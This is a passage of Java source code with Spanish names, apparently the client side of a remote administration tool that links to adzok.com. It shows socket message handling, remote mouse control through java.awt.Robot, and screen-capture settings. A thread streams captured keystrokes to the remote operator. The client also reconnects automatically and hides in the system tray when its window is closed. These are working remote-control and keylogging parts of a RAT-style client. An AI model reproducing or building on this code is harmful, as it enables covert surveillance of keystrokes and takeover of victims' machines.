        AffineTransform tx = new AffineTransform();
        tx.scale(resize, resize);
        AffineTransformOp op = new AffineTransformOp(tx, AffineTransformOp.TYPE_BILINEAR);
        BufferedImage biNew = new BufferedImage((int) (bi.getWidth() * resize), (int) (bi.getHeight() * resize), bi.getType());
        return op.filter(bi, biNew);
    }

    private void gestionarMensaje(String tipo, Object informacion) {
        mensaje mens = new mensaje();
        mens.setTipo((String) tipo);
        if (tipo.equals("Archivo")) {
            mens.setArchivo((byte[]) informacion);
        } else if (tipo.equals("Mensaje")) {
            mens.setMensaje((String) informacion);
        } else if (tipo.equals("bufferMensaje")) {
            mens.setBufferMensaje((StringBuffer) informacion);
        } else if (tipo.equals("Dato")) {
            mens.setDato((Integer) informacion);
        }
        enviarMensaje(mens);
    }

    private Object descargarInformacion() {
        Object objeto = null;
        mensaje mensaje = null;
        try {
            mensaje = (mensaje) entrada.readObject();
            if (mensaje.getTipo().equals("Archivo")) {
                ByteArrayInputStream archivo = new ByteArrayInputStream(mensaje.getArchivo());
                GZIPInputStream gzipin = new GZIPInputStream(archivo);
                archivo.close();
                ByteArrayOutputStream baos = new ByteArrayOutputStream(mensaje.getArchivo().length * 2);
                int len = -1;
                while ((len = gzipin.read(b)) != -1) {
                    baos.write(b, 0, len);
                }
                objeto = baos.toByteArray();
                gzipin.close();
                baos.close();
            } else if (mensaje.getTipo().equals("Mensaje")) {
                objeto = mensaje.getMensaje();
            } else if (mensaje.getTipo().equals("bufferMensaje")) {
                objeto = mensaje.getBufferMensaje();
            } else if (mensaje.getTipo().equals("Dato")) {
                objeto = mensaje.getDato();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            desconectar();
            conectado = false;
        }
        return objeto;
    }

    private void obtenerPropiedades(StringBuffer string) {
        String temp = string.toString();
        String[] prop = temp.split("/");
        calidadImage = Integer.valueOf(prop[0]);
        resize = Double.valueOf(prop[1]);
        tipoArchivo = prop[2];

        try {
            mseg = Integer.valueOf(prop[3]);
        } catch (NumberFormatException e) {
            mseg = 200;
        }
    }

    private void obtenerMouse() throws AWTException {
        StringBuffer string = null;
        if (capmouse) {
            string = (StringBuffer) descargarInformacion();

            int a = InputEvent.BUTTON3_MASK;
            String[] result = string.toString().split("/");
            com = result[0];
            boton = Integer.parseInt(result[1]);
            if (boton == 1) {
                boton = InputEvent.BUTTON1_MASK;
            } else if (boton == 3) {
                boton = InputEvent.BUTTON3_MASK;
            }
            posx = Integer.parseInt(result[2]);
            posy = Integer.parseInt(result[3]);

            Robot robot = new Robot();
            if (com.equals("CLICK")) {
                robot.mouseMove(posx, posy);
                robot.mousePress(boton);
                robot.mouseRelease(boton);
            } else if (com.equals("DOBLE")) {
                robot.mouseMove(posx, posy);
                robot.mousePress(boton);
                robot.mouseRelease(boton);
                robot.mousePress(boton);
                robot.mouseRelease(boton);
            } else if (com.equals("MOVE")) {
                robot.mouseMove(posx, posy);
            }
        }
    }

    public boolean enviarMensaje(mensaje m) {
        try {
            salida.writeObject(m);
            salida.flush();
        } catch (IOException ex) {
            desconectar();
            return false;
        }
        return true;
    }

    String verNombre() {
        String nuevo = getClass().getResource("svd.class").getPath();
        int fin = nuevo.length();
        int j = 0, i;
        for (i = fin - 1; i >= 0; i--) {
            if (nuevo.charAt(i) == '/') {
                j++;
            }
            if (j == 2) {
                break;
            }
        }
        return nuevo.substring(i + 1).replace("!/svd.class", "").toString();
    }

    public void desconectar() {
        try {
            entrada.close();
            salida.close();
            cliente.close();
        } catch (IOException ex) {
            entrada = null;
            salida = null;
            cliente = null;
        }
        info.setText("Desconectado");
    	info2.setText("Reintentando en 3 min");
        conectado = false;
        cmdInic = true;
    }

    public void actionPerformed(ActionEvent e) {
        if (e.getSource()==desconectar) {
            System.exit(0);
        }
        if (e.getSource() == botonlink) {
            try {
                Desktop.getDesktop().browse(new URI("http://adzok.com"));
            } catch (IOException ex) {
                Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
            } catch (URISyntaxException ex) {
                Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

    class keyh extends Thread {

        @Override
        public void run() {
            key k = new key();
            k.start();

            gestionarMensaje("Dato", 7);
            gestionarMensaje("Mensaje", "\"ACTIVATED\"");

            while (activated) {
                String b = k.getChar();
                if (!b.equals("!")) {
                    gestionarMensaje("Dato", 7);
                    gestionarMensaje("Mensaje", String.valueOf(b));
                }
                try {
                    Thread.sleep(20);
                } catch (InterruptedException ex) {
                    Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
                }
                k.activated = activated;
            }
        }
    }

    class Mensaje extends Thread {

        String titulo, mensaje;
        int tipo;

        public Mensaje(String titulo, String mensaje, int tipo) {
            this.titulo = titulo;
            this.mensaje = mensaje;
            this.tipo = tipo;
        }

        public void run() {
            if (KeyEvent.VK_I == tipo) {
                JOptionPane.showMessageDialog(null, mensaje, titulo, JOptionPane.INFORMATION_MESSAGE);
            } else if (KeyEvent.VK_E == tipo) {
                JOptionPane.showMessageDialog(null, mensaje, titulo, JOptionPane.ERROR_MESSAGE);
            } else {
                JOptionPane.showMessageDialog(null, mensaje, titulo, JOptionPane.WARNING_MESSAGE);
            }

        }
    }

    class cerrar extends WindowAdapter {

        Frame oframe;

        public cerrar(Frame miframe) {
            oframe = miframe;
        }
        
        public void windowDeiconified(WindowEvent ev) {
        }

        public void windowIconified(WindowEvent ev) {

        }

        public void windowClosing(WindowEvent ev) {
            try {
                tray.add(trayIcon);
                //trayIcon.displayMessage("Minimizando", "Trabajando en segundo plano", TrayIcon.MessageType.INFO);
            } catch (AWTException ex) {
                Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
}
